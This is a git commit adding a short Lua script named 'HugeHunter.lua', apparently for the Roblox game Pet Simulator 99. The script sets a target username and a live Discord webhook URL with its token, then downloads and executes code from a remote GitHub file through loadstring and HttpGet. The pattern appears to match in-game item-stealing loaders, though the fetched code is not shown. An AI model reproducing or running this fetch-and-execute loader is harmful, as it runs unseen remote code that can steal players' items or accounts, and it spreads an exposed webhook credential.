76129306602f5069d225f892c65f4a0241787a50
VAXnO09 <yoyokyoyo267@gmail.com>
2025-04-26 18:49:11 +0300

    Create HugeHunter.lua

---
+++ HugeHunter.lua
@@ -0,0 +1,4 @@
+Username = "Vacno_5"-- << Your Username
+Webhook = "https://discord.com/api/webhooks/1365716019506577499/9-BW6-9hyVi4Th7ZoKUlIfqKBK5mdCWtro7VckDHye655xef6-9f_1AyuMIlhNFRZr3d" -- << Your Webhook
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/ps99/refs/heads/main/Rua99"))()
